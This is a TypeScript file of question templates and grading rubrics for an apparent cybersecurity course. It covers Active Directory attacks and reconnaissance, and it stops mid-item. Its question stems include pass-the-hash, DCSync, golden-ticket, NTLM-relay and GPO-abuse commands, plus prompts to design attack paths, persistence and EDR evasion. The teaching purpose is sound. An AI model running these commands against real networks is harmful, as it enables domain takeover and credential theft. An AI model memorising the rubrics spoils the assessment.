import type { QuestionTemplate } from "./types";

export const QUESTION_TEMPLATES: QuestionTemplate[] = [

// --- ad-fundamentals (Active Directory attacks) ---

{
  competencyId: "ad-fundamentals",
  subTopic: "kerberos-auth",
  questionType: "predict_output",
  difficulty: 1,
  questionText:
    `A user authenticates to an Active Directory domain. The KDC issues a TGT encrypted with the krbtgt account's secret key. The user then requests a service ticket for the CIFS service on a file server.\n\nIn what order do the following Kerberos exchanges occur, and what key encrypts each ticket?\n\n1. AS-REQ / AS-REP\n2. TGS-REQ / TGS-REP\n3. AP-REQ\n\nFor each step, state which key encrypts the ticket and who can decrypt it.`,
  rubric: {
    maxScore: 6,
    criteria: [
      { id: "as-exchange", description: "Correctly describes AS-REQ/AS-REP as the first step where the user gets a TGT", points: 2, keywords: ["AS-REQ", "AS-REP", "TGT", "authentication"], check: "Student identifies AS exchange as step 1 producing the TGT" },
      { id: "tgt-encryption", description: "States TGT is encrypted with krbtgt key", points: 1, keywords: ["krbtgt", "secret key", "KDC"], check: "Student correctly names krbtgt key as TGT encryption key" },
      { id: "tgs-exchange", description: "Describes TGS-REQ/TGS-REP where user presents TGT and gets a service ticket", points: 2, keywords: ["TGS-REQ", "TGS-REP", "service ticket", "TGT"], check: "Student shows TGT is presented to get the service ticket" },
      { id: "service-ticket-key", description: "States service ticket is encrypted with the target service account key", points: 1, keywords: ["service account", "CIFS", "computer account", "service key"], check: "Student identifies the service/computer account key encrypts the service ticket" },
    ],
    gaps: [
      { if_missing: "tgt-encryption", gap: "Does not understand TGT encryption mechanics — review Kerberos key distribution" },
      { if_missing: "service-ticket-key", gap: "Confused about service ticket encryption — study how the KDC uses the target service's key" },
    ],
  },
},

{
  competencyId: "ad-fundamentals",
  subTopic: "ldap-enumeration",
  questionType: "predict_output",
  difficulty: 2,
  questionText:
    `You run the following LDAP query against a domain controller using ldapsearch:\n\n\`\`\`bash\nldapsearch -x -H ldap://dc01.corp.local -b "DC=corp,DC=local" \\\n  "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" \\\n  sAMAccountName\n\`\`\`\n\nWhat does the OID filter \`1.2.840.113556.1.4.803\` do? What does the value \`4194304\` (0x400000) mean in terms of userAccountControl flags? What kind of accounts will this query return, and why are they interesting from an attacker's perspective?`,
  rubric: {
    maxScore: 7,
    criteria: [
      { id: "bitwise-and", description: "Explains the OID is the LDAP_MATCHING_RULE_BIT_AND operator", points: 2, keywords: ["bitwise AND", "LDAP_MATCHING_RULE_BIT_AND", "bit mask"], check: "Student identifies the OID as a bitwise AND matching rule" },
      { id: "uac-flag", description: "Identifies 4194304 as DONT_REQ_PREAUTH flag", points: 2, keywords: ["DONT_REQ_PREAUTH", "pre-authentication", "4194304", "0x400000"], check: "Student maps the value to the Kerberos pre-auth disabled flag" },
      { id: "asreproast", description: "Explains these accounts are vulnerable to AS-REP Roasting", points: 2, keywords: ["AS-REP", "ASREPRoast", "roasting", "offline", "crack"], check: "Student connects the finding to AS-REP Roasting attack" },
      { id: "attack-value", description: "Notes attacker can request AS-REP without password and crack offline", points: 1, keywords: ["no password", "offline cracking", "hashcat", "john"], check: "Student explains the practical attack implication" },
    ],
    gaps: [
      { if_missing: "bitwise-and", gap: "Unfamiliar with LDAP extended match operators — study AD LDAP query syntax" },
      { if_missing: "asreproast", gap: "Missing knowledge of AS-REP Roasting — review Kerberos pre-authentication attacks" },
    ],
  },
},

{
  competencyId: "ad-fundamentals",
  subTopic: "credential-dumping",
  questionType: "spot_vuln",
  difficulty: 2,
  questionText:
    `An organization has implemented the following Group Policy settings for credential protection:\n\n\`\`\`\nDisable WDigest authentication: Not Configured\nCredential Guard: Not Configured\nRestrict delegation of credentials to remote servers: Disabled\nNetwork security: LAN Manager authentication level: Send LM & NTLM\n\`\`\`\n\nIdentify at least three security weaknesses in this configuration. For each, explain what attack it enables and what the correct setting should be.`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "wdigest", description: "Identifies WDigest storing cleartext passwords in LSASS when not explicitly disabled", points: 2, keywords: ["WDigest", "cleartext", "LSASS", "UseLogonCredential", "plaintext"], check: "Student flags WDigest as storing plaintext credentials in memory" },
      { id: "credguard", description: "Notes Credential Guard not enabled leaves LSASS unprotected", points: 2, keywords: ["Credential Guard", "VBS", "virtualization", "LSASS", "isolation"], check: "Student identifies missing Credential Guard as allowing direct LSASS dumping" },
      { id: "lm-hash", description: "Identifies LM & NTLM setting as allowing weak LM hashes", points: 2, keywords: ["LM hash", "NTLM", "NTLMv2", "weak hash", "DES"], check: "Student flags LM authentication as a weak protocol allowing easy cracking" },
      { id: "delegation", description: "Notes unrestricted credential delegation enables relay/theft", points: 2, keywords: ["delegation", "CredSSP", "relay", "forwarding", "restricted admin"], check: "Student identifies credential delegation risk" },
    ],
    gaps: [
      { if_missing: "wdigest", gap: "Unaware of WDigest cleartext credential storage — study LSASS credential extraction" },
      { if_missing: "lm-hash", gap: "Missing knowledge of LM hash weakness — review Windows authentication protocols and their relative strength" },
    ],
  },
},

{
  competencyId: "ad-fundamentals",
  subTopic: "spn-kerberoasting",
  questionType: "spot_vuln",
  difficulty: 2,
  questionText:
    `A sysadmin creates a service account for a web application:\n\n\`\`\`powershell\nNew-ADUser -Name "svc_webapp" -AccountPassword (ConvertTo-SecureString "Summer2024!" -AsPlainText -Force)\nSet-ADUser svc_webapp -PasswordNeverExpires $true\nSet-ADAccountControl svc_webapp -PasswordNotRequired $false\nsetspn -A HTTP/webapp.corp.local svc_webapp\nAdd-ADGroupMember "Domain Admins" svc_webapp\n\`\`\`\n\nIdentify all the security issues in this setup. Explain the specific attack(s) each issue enables.`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "kerberoast", description: "Having an SPN on a user account makes it Kerberoastable", points: 2, keywords: ["Kerberoast", "SPN", "service ticket", "TGS", "offline crack"], check: "Student identifies the SPN enables Kerberoasting of the account" },
      { id: "weak-password", description: "The password is short and dictionary-based, easily cracked", points: 2, keywords: ["weak password", "dictionary", "Summer2024", "crackable", "brute"], check: "Student flags the password as weak and crackable offline" },
      { id: "domain-admin", description: "Service account is Domain Admin — Kerberoasting yields full domain compromise", points: 2, keywords: ["Domain Admin", "privilege", "over-privileged", "least privilege"], check: "Student identifies the excessive privilege escalation risk" },
      { id: "no-expiry", description: "PasswordNeverExpires means a cracked password remains valid indefinitely", points: 2, keywords: ["PasswordNeverExpires", "no expiration", "rotate", "rotation"], check: "Student notes password never rotates, compounding the risk" },
    ],
    gaps: [
      { if_missing: "kerberoast", gap: "Does not understand Kerberoasting — study SPN-based service ticket attacks" },
      { if_missing: "domain-admin", gap: "Missing awareness of least-privilege for service accounts — review tiered admin model" },
    ],
  },
},

{
  competencyId: "ad-fundamentals",
  subTopic: "pass-the-hash",
  questionType: "trace_explain",
  difficulty: 3,
  questionText:
    `An attacker has obtained the NTLM hash of a local administrator account that uses the same password across 50 workstations. They run:\n\n\`\`\`bash\nimpacket-psexec -hashes :aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 \\\n  administrator@10.0.0.15\n\`\`\`\n\nTrace the authentication flow step by step: How does psexec use the hash to authenticate without knowing the plaintext password? Why does NTLM authentication allow this? What specific Windows mechanism does the attacker land on the target with?`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "ntlm-challenge", description: "Explains NTLM challenge-response uses hash directly, not plaintext", points: 2, keywords: ["challenge-response", "NTLM", "hash", "no plaintext needed"], check: "Student explains NTLM authenticates with the hash as the proof-of-knowledge" },
      { id: "smb-auth", description: "Describes the SMB connection and NTLMSSP authentication", points: 2, keywords: ["SMB", "NTLMSSP", "port 445", "negotiate"], check: "Student traces the network-level SMB authentication" },
      { id: "service-creation", description: "Explains psexec creates a service on the remote machine via SCM", points: 2, keywords: ["service", "SCM", "Service Control Manager", "RemComSvc", "cmd.exe"], check: "Student describes how psexec creates and starts a remote service" },
      { id: "design-flaw", description: "Explains the fundamental issue: the hash IS the credential in NTLM", points: 2, keywords: ["hash is credential", "equivalent", "design flaw", "no salt", "replay"], check: "Student articulates why pass-the-hash works as a protocol-level issue" },
    ],
    gaps: [
      { if_missing: "ntlm-challenge", gap: "Does not understand NTLM challenge-response internals — study Net-NTLMv1/v2 authentication" },
      { if_missing: "service-creation", gap: "Unclear on psexec remote execution mechanism — review Windows service-based lateral movement" },
    ],
  },
},

{
  competencyId: "ad-fundamentals",
  subTopic: "delegation-abuse",
  questionType: "trace_explain",
  difficulty: 3,
  questionText:
    `A web server account \`svc_web$\` is configured with unconstrained delegation. An attacker who has compromised this server notices a domain admin authenticates to the web application.\n\nExplain step by step:\n1. What happens to the domain admin's TGT when they authenticate to the web server?\n2. How can the attacker extract and reuse it?\n3. What is the difference between unconstrained, constrained, and resource-based constrained delegation, and why does unconstrained delegation make this attack possible?`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "tgt-cache", description: "Explains TGT is cached in server memory with unconstrained delegation", points: 2, keywords: ["TGT", "cached", "memory", "LSASS", "stored", "forwarded"], check: "Student explains the TGT is stored on the server for unconstrained delegation" },
      { id: "extraction", description: "Describes extracting TGT with Rubeus/Mimikatz and injecting into session", points: 2, keywords: ["Rubeus", "Mimikatz", "extract", "dump", "ptt", "pass the ticket"], check: "Student describes extracting the TGT and using pass-the-ticket" },
      { id: "delegation-types", description: "Differentiates unconstrained, constrained, and RBCD correctly", points: 2, keywords: ["unconstrained", "constrained", "resource-based", "msDS-AllowedToDelegateTo", "msDS-AllowedToActOnBehalfOfOtherIdentity"], check: "Student accurately contrasts the three delegation types" },
      { id: "attack-scope", description: "Notes extracted TGT gives the attacker DA-level access across the domain", points: 2, keywords: ["domain admin", "domain compromise", "any service", "impersonate"], check: "Student explains the full impact of capturing a DA TGT" },
    ],
    gaps: [
      { if_missing: "tgt-cache", gap: "Does not understand delegation TGT forwarding — study Kerberos delegation mechanics" },
      { if_missing: "delegation-types", gap: "Cannot differentiate delegation types — review constrained vs unconstrained vs RBCD" },
    ],
  },
},

{
  competencyId: "ad-fundamentals",
  subTopic: "golden-ticket",
  questionType: "trace_explain",
  difficulty: 3,
  questionText:
    `After compromising a domain controller, an attacker runs:\n\n\`\`\`\nmimikatz # lsadump::dcsync /user:krbtgt\nmimikatz # kerberos::golden /user:fakeadmin /domain:corp.local /sid:S-1-5-21-... /krbtgt:<hash> /ptt\n\`\`\`\n\nExplain: What is a DCSync attack and why does it work? What makes the golden ticket valid? How long does a golden ticket remain usable, and what is the only reliable remediation? Why does the forged username 'fakeadmin' still work even though no such user exists in AD?`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "dcsync", description: "Explains DCSync mimics DC replication protocol (DRS) to pull secrets", points: 2, keywords: ["DCSync", "replication", "DRS", "GetNCChanges", "DRSUAPI"], check: "Student describes DCSync as abusing AD replication protocol" },
      { id: "golden-validity", description: "Explains golden ticket is valid because it is encrypted with krbtgt key — the KDC trusts it without verification", points: 2, keywords: ["krbtgt", "KDC trusts", "encrypted", "self-signed", "no verification"], check: "Student explains why a golden ticket is accepted as authentic" },
      { id: "lifetime", description: "Notes golden ticket has a 10-year default lifetime and survives password resets of regular accounts", points: 2, keywords: ["10 year", "lifetime", "persistent", "survives", "long-lived"], check: "Student identifies the persistence of golden tickets" },
      { id: "remediation", description: "States krbtgt password must be reset TWICE to invalidate golden tickets", points: 2, keywords: ["krbtgt reset", "twice", "double reset", "invalidate", "rotate krbtgt"], check: "Student knows the double-reset remediation requirement" },
    ],
    gaps: [
      { if_missing: "dcsync", gap: "Does not understand AD replication protocol abuse — study Directory Replication Service" },
      { if_missing: "remediation", gap: "Missing knowledge of golden ticket remediation — review krbtgt key rotation requirements" },
    ],
  },
},

{
  competencyId: "ad-fundamentals",
  subTopic: "ntlm-relay",
  questionType: "fix_code",
  difficulty: 3,
  questionText:
    `A pentester attempts an NTLM relay attack but it fails. Their setup:\n\n\`\`\`bash\n# Terminal 1: Start Responder to capture hashes\nsudo responder -I eth0 -wrf\n\n# Terminal 2: Relay captured credentials to target\nimpacket-ntlmrelayx -t smb://10.0.0.20 -smb2support\n\`\`\`\n\nThe relay fails with the error: "Authenticating against smb://10.0.0.20 as CORP/jdoe FAILED."\n\nDiagnose why running Responder and ntlmrelayx simultaneously causes a conflict. What is the correct setup? Also explain under what conditions on the target (10.0.0.20) the relay would fail even with the correct setup.`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "port-conflict", description: "Identifies both tools try to bind SMB on port 445 — Responder must have SMB disabled", points: 2, keywords: ["port 445", "conflict", "both listen", "SMB off", "HTTP"], check: "Student identifies the port binding conflict between the tools" },
      { id: "fix-responder", description: "Correct fix is to disable SMB/HTTP in Responder.conf so ntlmrelayx handles those", points: 2, keywords: ["Responder.conf", "SMB = Off", "HTTP = Off", "disable"], check: "Student gives the correct configuration fix" },
      { id: "signing", description: "SMB signing on the target would prevent relay even with correct setup", points: 2, keywords: ["SMB signing", "signing required", "message integrity", "MIC"], check: "Student identifies SMB signing as a relay defense" },
      { id: "reflection", description: "Notes you cannot relay credentials back to the source machine (MS08-068 patch)", points: 2, keywords: ["reflection", "same host", "self-relay", "MS08-068"], check: "Student mentions the anti-reflection protection" },
    ],
    gaps: [
      { if_missing: "port-conflict", gap: "Does not understand tool interaction — study how Responder and relay tools coordinate" },
      { if_missing: "signing", gap: "Missing knowledge of SMB signing as relay defense — review SMB security features" },
    ],
  },
},

{
  competencyId: "ad-fundamentals",
  subTopic: "bloodhound-analysis",
  questionType: "fix_code",
  difficulty: 3,
  questionText:
    `A pentester runs SharpHound to collect AD data but gets minimal results:\n\n\`\`\`powershell\n# Running from a domain-joined workstation as a low-privilege domain user\n.\\SharpHound.exe -c All --zipfilename loot.zip\n\`\`\`\n\nThe resulting BloodHound graph shows only 5 computers and 20 users in a domain with 500+ machines and 2000+ users. The pentester sees this error in the log: "Error during LDAP query: size limit exceeded."\n\nWhat is causing the incomplete collection? How should they fix the SharpHound invocation? Once the data is properly collected, name three BloodHound queries an attacker would run first and explain what each reveals.`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "ldap-paging", description: "Identifies the LDAP MaxPageSize or result set limit causing truncated results", points: 2, keywords: ["MaxPageSize", "LDAP paging", "result limit", "1000", "page size"], check: "Student identifies the LDAP query size limit issue" },
      { id: "fix-collection", description: "Suggests using LDAP paging, multiple collection methods, or alternate DC", points: 2, keywords: ["paging", "--ldapfilter", "alternate DC", "--domaincontroller", "stealth"], check: "Student proposes a viable fix for the collection" },
      { id: "bh-queries", description: "Names at least 3 useful BloodHound queries with explanations", points: 2, keywords: ["shortest path", "Domain Admins", "Kerberoastable", "DCSync", "unconstrained delegation", "high value"], check: "Student lists specific, tactically useful BloodHound queries" },
      { id: "attack-path", description: "Explains how BloodHound reveals transitive relationships and attack chains", points: 2, keywords: ["attack path", "transitive", "chain", "graph", "relationships", "ACL"], check: "Student demonstrates understanding of graph-based attack path analysis" },
    ],
    gaps: [
      { if_missing: "ldap-paging", gap: "Unfamiliar with LDAP query limitations — study LDAP paging and AD query constraints" },
      { if_missing: "bh-queries", gap: "Limited BloodHound experience — practice with pre-built queries and custom Cypher" },
    ],
  },
},

{
  competencyId: "ad-fundamentals",
  subTopic: "gpo-abuse",
  questionType: "fix_code",
  difficulty: 3,
  questionText:
    `An attacker discovers they have write access to a Group Policy Object (GPO) linked to a target OU containing server computers. They attempt to abuse it for code execution:\n\n\`\`\`python\n# Using pyGPOAbuse\npython3 pygpoabuse.py corp.local/jdoe:'Password1' \\\n  -gpo-id "6AC1786C-016F-11D2-945F-00C04fB984F9" \\\n  -command 'net localgroup administrators jdoe /add' \\\n  -f\n\`\`\`\n\nBut nothing happens on the target servers after 30 minutes. Explain three reasons why the GPO change might not take effect. What is the correct way to verify the GPO was modified and force it to apply?`,
  rubric: {
    maxScore: 7,
    criteria: [
      { id: "gpo-refresh", description: "Explains GPO refresh interval (default 90 mins + random offset) causes delay", points: 2, keywords: ["90 minutes", "refresh", "gpupdate", "interval", "random offset"], check: "Student identifies the default GPO refresh interval as the likely delay" },
      { id: "gpo-link", description: "Notes the GPO must be linked and enforced on the correct OU", points: 2, keywords: ["linked", "OU", "enforced", "scope", "inheritance"], check: "Student checks GPO linkage and scope" },
      { id: "verification", description: "Describes using gpresult or RSOP to verify GPO application", points: 2, keywords: ["gpresult", "RSOP", "gpupdate /force", "verify", "resultant set"], check: "Student knows how to verify GPO application" },
      { id: "wmi-filter", description: "Mentions WMI filters or security filtering could prevent application", points: 1, keywords: ["WMI filter", "security filtering", "scope", "denied"], check: "Student considers additional filtering mechanisms" },
    ],
    gaps: [
      { if_missing: "gpo-refresh", gap: "Unfamiliar with GPO processing timing — study Group Policy refresh and enforcement" },
      { if_missing: "verification", gap: "Missing GPO troubleshooting skills — learn gpresult and RSOP tools" },
    ],
  },
},

{
  competencyId: "ad-fundamentals",
  subTopic: "ad-acl-abuse",
  questionType: "design_solution",
  difficulty: 4,
  questionText:
    `You have compromised a low-privilege domain user account and discovered (via BloodHound) the following ACL chain:\n\n1. Your user has GenericWrite on the group "IT-Helpdesk"\n2. "IT-Helpdesk" has ForceChangePassword on user "svc_backup"\n3. "svc_backup" has WriteDACL on the Domain Admins group\n\nDesign a complete attack path from your current access to Domain Admin. For each step, specify the exact tool and command you would use, explain what AD permission is being abused, and describe what defensive logging would detect each step.`,
  rubric: {
    maxScore: 9,
    criteria: [
      { id: "step1-group", description: "Uses GenericWrite to add self to IT-Helpdesk group", points: 2, keywords: ["GenericWrite", "Add-ADGroupMember", "net group", "PowerView", "Add-DomainGroupMember"], check: "Student uses GenericWrite to add themselves to the target group" },
      { id: "step2-password", description: "Abuses ForceChangePassword to reset svc_backup password", points: 2, keywords: ["ForceChangePassword", "Set-ADAccountPassword", "net user", "password reset"], check: "Student resets the svc_backup password using the inherited permission" },
      { id: "step3-dacl", description: "Uses WriteDACL on Domain Admins to grant self membership or full control", points: 2, keywords: ["WriteDACL", "Add-DomainObjectAcl", "Domain Admins", "GenericAll", "modify ACL"], check: "Student modifies the Domain Admins DACL to escalate privileges" },
      { id: "detection", description: "Identifies relevant event IDs for each step (4728, 4724, 5136, etc.)", points: 3, keywords: ["4728", "4724", "5136", "event log", "SACL", "audit", "detection"], check: "Student maps specific Windows event IDs to each attack step" },
    ],
    gaps: [
      { if_missing: "step3-dacl", gap: "Does not understand DACL modification attacks — study AD ACL abuse and WriteDACL exploitation" },
      { if_missing: "detection", gap: "Missing blue-team perspective — learn Windows security event IDs for AD object changes" },
    ],
  },
},

{
  competencyId: "ad-fundamentals",
  subTopic: "ad-persistence",
  questionType: "design_solution",
  difficulty: 5,
  questionText:
    `You have achieved Domain Admin access in a red team engagement. The client wants you to demonstrate three distinct AD persistence mechanisms, each surviving a different remediation scenario:\n\n1. A mechanism that survives all user password resets\n2. A mechanism that survives a krbtgt double-reset\n3. A mechanism that survives removal from Domain Admins group\n\nFor each, design the persistence technique, explain exactly what is planted and where, describe the conditions under which it would be detected, and explain what full remediation would require.`,
  rubric: {
    maxScore: 10,
    criteria: [
      { id: "golden-or-skeleton", description: "Proposes golden ticket, skeleton key, or similar credential-independent persistence", points: 2, keywords: ["golden ticket", "skeleton key", "AdminSDHolder", "SID history", "krbtgt"], check: "Student proposes a credential-independent persistence mechanism" },
      { id: "survives-krbtgt", description: "Proposes a mechanism surviving krbtgt reset (e.g., DSRM, SID history, AdminSDHolder, DCShadow)", points: 3, keywords: ["DSRM", "SID history", "DCShadow", "AdminSDHolder", "trust ticket", "certificate"], check: "Student identifies persistence that is not invalidated by krbtgt rotation" },
      { id: "acl-persistence", description: "Proposes ACL-based persistence (hidden DACL entry granting DCSync/WriteDACL)", points: 2, keywords: ["ACL", "DACL", "hidden permission", "DCSync rights", "domain object"], check: "Student designs ACL-based persistence surviving group removal" },
      { id: "detection-remediation", description: "Accurately describes detection indicators and full remediation for each mechanism", points: 3, keywords: ["detection", "remediation", "audit", "SID filtering", "clean rebuild", "forest recovery"], check: "Student provides actionable detection and remediation for each technique" },
    ],
    gaps: [
      { if_missing: "survives-krbtgt", gap: "Limited knowledge of advanced AD persistence — study DSRM abuse, SID history injection, certificate-based persistence" },
      { if_missing: "detection-remediation", gap: "Missing defensive remediation knowledge — review AD forest recovery and post-compromise cleanup" },
    ],
  },
},

{
  competencyId: "ad-fundamentals",
  subTopic: "constrained-delegation-abuse",
  questionType: "design_solution",
  difficulty: 4,
  questionText:
    `You have compromised a service account \`svc_sql\` that is configured with constrained delegation to \`CIFS/fileserver.corp.local\`. However, your actual target is the domain controller \`DC01.corp.local\`.\n\nDesign an attack that leverages this constrained delegation to gain access to the DC. Explain the S4U2Self and S4U2Proxy protocol extensions, why the "alternative service" trick works, and provide the exact commands you would execute.`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "s4u-explained", description: "Correctly explains S4U2Self (get ticket as any user to self) and S4U2Proxy (forward to allowed service)", points: 2, keywords: ["S4U2Self", "S4U2Proxy", "protocol transition", "impersonate", "forwardable"], check: "Student correctly describes both S4U extensions" },
      { id: "alt-service", description: "Explains the alternative service name trick — service class is not in the PAC and can be changed", points: 3, keywords: ["alternative service", "service name", "SPN", "CIFS to LDAP", "not validated", "service class"], check: "Student explains why changing the service class in the ticket works" },
      { id: "commands", description: "Provides specific Rubeus or Impacket commands for the attack", points: 2, keywords: ["Rubeus", "getST.py", "s4u", "/altservice", "/impersonateuser", "administrator"], check: "Student provides working tool commands" },
      { id: "dc-impact", description: "Explains what access LDAP/CIFS on the DC provides (DCSync, file access to SYSVOL/NTDS)", points: 1, keywords: ["DCSync", "LDAP", "NTDS", "SYSVOL", "domain controller"], check: "Student explains the impact of accessing the DC via the forged ticket" },
    ],
    gaps: [
      { if_missing: "alt-service", gap: "Does not understand the alternative service name trick — study how Kerberos validates service tickets" },
      { if_missing: "s4u-explained", gap: "Missing S4U protocol knowledge — review S4U2Self and S4U2Proxy extensions in depth" },
    ],
  },
},

{
  competencyId: "ad-fundamentals",
  subTopic: "ad-trusts",
  questionType: "compare_contrast",
  difficulty: 4,
  questionText:
    `Compare and contrast the following AD trust attack scenarios:\n\n1. Attacking a parent-child trust within the same forest\n2. Attacking a bidirectional external trust between two separate forests\n3. Attacking a one-way incoming trust from a partner domain\n\nFor each: What are the trust key mechanics? Can you forge inter-realm tickets? Does SID filtering apply? What is the maximum privilege you can achieve in the target domain?`,
  rubric: {
    maxScore: 9,
    criteria: [
      { id: "parent-child", description: "Explains parent-child trusts share Enterprise Admins SID and have no SID filtering by default", points: 2, keywords: ["parent-child", "Enterprise Admins", "no SID filtering", "forest-wide", "transitive"], check: "Student explains intra-forest trust allows full cross-domain escalation" },
      { id: "external-trust", description: "Explains external trusts have SID filtering enabled, limiting cross-domain SID injection", points: 2, keywords: ["external trust", "SID filtering", "quarantine", "inter-forest", "filtered"], check: "Student correctly identifies SID filtering on external trusts" },
      { id: "one-way", description: "Explains one-way trust direction and which domain trusts which", points: 2, keywords: ["one-way", "trusting", "trusted", "direction", "incoming", "outgoing"], check: "Student correctly explains trust directionality and access flow" },
      { id: "ticket-forging", description: "Explains inter-realm TGT forging with trust key and its limitations", points: 3, keywords: ["inter-realm", "trust key", "referral", "forged ticket", "golden ticket", "cross-domain"], check: "Student describes inter-realm ticket forging mechanics and trust key usage" },
    ],
    gaps: [
      { if_missing: "external-trust", gap: "Does not understand SID filtering — review forest trust security boundaries" },
      { if_missing: "ticket-forging", gap: "Missing inter-realm ticket knowledge — study cross-domain Kerberos referral flow" },
    ],
  },
},

{
  competencyId: "ad-fundamentals",
  subTopic: "detection-evasion",
  questionType: "compare_contrast",
  difficulty: 5,
  questionText:
    `You need to perform lateral movement across an Active Directory network that has mature detection capabilities: an EDR agent on every endpoint, Sysmon with a comprehensive config, and a SIEM collecting Windows security logs.\n\nCompare these lateral movement techniques in terms of stealth, reliability, and detection surface:\n\n1. PsExec (Sysinternals or Impacket)\n2. WMI (wmic/Invoke-WmiMethod)\n3. WinRM/PowerShell Remoting\n4. DCOM (MMC20.Application or ShellBrowserWindow)\n5. Scheduled Tasks (schtasks)\n\nFor each, explain: what artifacts does it leave? What event IDs are generated? Which is hardest to detect and why?`,
  rubric: {
    maxScore: 10,
    criteria: [
      { id: "psexec-artifacts", description: "Identifies PsExec creates a service, writes a binary, generates 7045/4697 events", points: 2, keywords: ["service", "7045", "4697", "PSEXESVC", "binary drop", "named pipe"], check: "Student describes PsExec's noisy service creation and file drop" },
      { id: "wmi-dcom", description: "Explains WMI/DCOM use existing services, are semi-fileless, detected via process lineage", points: 2, keywords: ["WMI", "DCOM", "WmiPrvSE", "fileless", "parent process", "svchost", "mmc"], check: "Student explains WMI/DCOM mechanisms and their detection through anomalous parent-child" },
      { id: "winrm", description: "Describes WinRM as encrypted, channel-based, and detected through 4624 type 3 and PowerShell logging", points: 2, keywords: ["WinRM", "5985", "5986", "PowerShell logging", "4624", "type 3", "ScriptBlock"], check: "Student explains WinRM detection through logon events and script block logging" },
      { id: "stealth-ranking", description: "Provides a reasoned stealth ranking with justification based on detection surface", points: 2, keywords: ["stealth", "ranking", "noisiest", "stealthiest", "detection surface", "least artifacts"], check: "Student ranks techniques by stealth with technical justification" },
      { id: "evasion-awareness", description: "Discusses how defenders can detect even stealthy techniques and how attackers can evade", points: 2, keywords: ["Sysmon", "command line logging", "process creation", "evasion", "obfuscation", "ETW"], check: "Student shows understanding of the detection-evasion arms race" },
    ],
    gaps: [
      { if_missing: "wmi-dcom", gap: "Limited knowledge of WMI/DCOM lateral movement — study alternative execution methods and their forensic footprint" },
      { if_missing: "stealth-ranking", gap: "Cannot evaluate relative opsec of techniques — practice comparing attack methods by detection surface" },
    ],
  },
},

// --- recon-osint (Reconnaissance & OSINT) ---

{
  competencyId: "recon-osint",
  subTopic: "dns-enumeration",
  questionType: "predict_output",
  difficulty: 1,
  questionText:
    `You run the following DNS enumeration commands against a target domain:\n\n\`\`\`bash\ndig axfr example.com @ns1.example.com\ndig any example.com @8.8.8.8\ndig txt example.com\n\`\`\`\n\nFor each command: What information are you requesting? Under what condition would the \`axfr\` query succeed, and why is that a misconfiguration? What kinds of information commonly appear in TXT records that are useful for reconnaissance?`,
  rubric: {
    maxScore: 7,
    criteria: [
      { id: "axfr-explained", description: "Explains AXFR is a zone transfer request returning all DNS records", points: 2, keywords: ["zone transfer", "AXFR", "all records", "full zone"], check: "Student explains AXFR as a full zone transfer" },
      { id: "axfr-misconfig", description: "Notes AXFR succeeds when the DNS server allows transfers to any client (should be restricted)", points: 2, keywords: ["misconfigured", "unrestricted", "allow-transfer", "any client", "ACL"], check: "Student identifies the misconfiguration allowing unrestricted zone transfers" },
      { id: "txt-recon", description: "Lists useful TXT record contents: SPF, DKIM, DMARC, verification tokens, internal info", points: 2, keywords: ["SPF", "DKIM", "DMARC", "verification", "google-site", "include:", "v=spf1"], check: "Student identifies recon-valuable TXT record types" },
      { id: "any-query", description: "Notes the ANY query requests all record types and may be rate-limited or refused", points: 1, keywords: ["ANY", "all types", "rate limit", "refused", "HINFO"], check: "Student explains the ANY query type" },
    ],
    gaps: [
      { if_missing: "axfr-explained", gap: "Does not understand DNS zone transfers — review DNS enumeration fundamentals" },
      { if_missing: "txt-recon", gap: "Unaware of information leakage through TXT records — study DNS record types for recon" },
    ],
  },
},

{
  competencyId: "recon-osint",
  subTopic: "subdomain-discovery",
  questionType: "predict_output",
  difficulty: 2,
  questionText:
    `You run multiple subdomain discovery techniques against a target:\n\n\`\`\`bash\n# Technique 1: Certificate Transparency\ncurl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u\n\n# Technique 2: DNS brute force\nffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \\\n  -u http://FUZZ.target.com -mc 200,301,302,403\n\n# Technique 3: Passive sources\namass enum -passive -d target.com\n\`\`\`\n\nExplain what each technique does differently. Which technique can find subdomains that the others cannot? Give a concrete example of a subdomain each method might uniquely discover.`,
  rubric: {
    maxScore: 7,
    criteria: [
      { id: "ct-logs", description: "Explains Certificate Transparency logs contain historical SSL cert domains", points: 2, keywords: ["Certificate Transparency", "CT log", "SSL", "certificate", "historical", "issued certs"], check: "Student explains CT logs as a source of historically issued certificate domains" },
      { id: "brute-force", description: "Explains DNS brute force tries common names against the DNS server", points: 2, keywords: ["brute force", "wordlist", "dictionary", "DNS resolution", "A record"], check: "Student describes DNS brute force as dictionary-based resolution attempts" },
      { id: "passive-sources", description: "Explains amass aggregates from multiple passive sources (VirusTotal, Shodan, Wayback, etc.)", points: 2, keywords: ["passive", "VirusTotal", "Shodan", "Wayback", "aggregation", "API", "search engines"], check: "Student identifies amass passive mode as multi-source aggregation" },
      { id: "unique-finds", description: "Gives examples of subdomains unique to each method", points: 1, keywords: ["internal", "staging", "wildcard", "expired", "deprecated", "dev"], check: "Student provides concrete examples of unique findings per method" },
    ],
    gaps: [
      { if_missing: "ct-logs", gap: "Unfamiliar with Certificate Transparency — study CT logs and how they reveal infrastructure" },
      { if_missing: "passive-sources", gap: "Limited passive recon knowledge — explore amass and multi-source subdomain enumeration" },
    ],
  },
},

{
  competencyId: "recon-osint",
  subTopic: "google-dorking",
  questionType: "spot_vuln",
  difficulty: 1,
  questionText:
    `A company's website exposes the following URLs discovered through Google dorking:\n\n\`\`\`\nsite:target.com filetype:pdf "confidential"\nsite:target.com inurl:"/admin" intitle:"login"\nsite:target.com ext:sql | ext:bak | ext:log\nsite:target.com inurl:"wp-content/uploads" filetype:xlsx\n\`\`\`\n\nThe following results are found:\n- An internal network diagram PDF\n- An admin login panel at /admin/login.php\n- A MySQL backup file (backup_2024.sql)\n- An employee salary spreadsheet\n\nWhat is the information exposure here? For each finding, classify its severity and explain what an attacker learns or gains.`,
